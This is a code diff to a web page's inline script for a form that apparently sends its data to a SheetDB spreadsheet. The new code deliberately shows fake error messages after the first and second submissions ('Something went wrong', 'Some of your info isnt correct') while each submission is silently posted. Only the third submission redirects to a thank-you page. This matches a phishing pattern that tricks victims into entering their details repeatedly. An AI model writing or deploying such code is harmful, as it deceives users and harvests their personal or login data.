@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -41,20 +44,32 @@
   
     <script src="app.js"></script>
   <script>
-  var form = document.getElementById('sheetdb-form');
-  form.addEventListener("submit", e => {
-    e.preventDefault();
-    fetch(form.action, {
-        method : "POST",
-        body: new FormData(document.getElementById("sheetdb-form")),
-    }).then(
-        response => response.json()
-    ).then((html) => {
-      // you can put any JS code here
-        alert('Something went wrong')
-      
-    });
+ var form = document.getElementById('sheetdb-form');
+var clickCount = 0;
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  clickCount++; // increment the click count on each submit
+
+  fetch(form.action, {
+    method : "POST",
+    body: new FormData(document.getElementById("sheetdb-form")),
+  }).then(
+    response => response.json()
+  ).then((html) => {
+    // show different alerts based on click count
+    if (clickCount === 1) {
+      alert('Something went wrong');
+    } else if (clickCount === 2) {
+      alert('Some of your info isnt correct. Please try again.');
+    } else {
+      window.location.href = "thanks.html"; // redirect on the third click
+    }
   });
+});
+
+
+
 </script>
 </body>
 
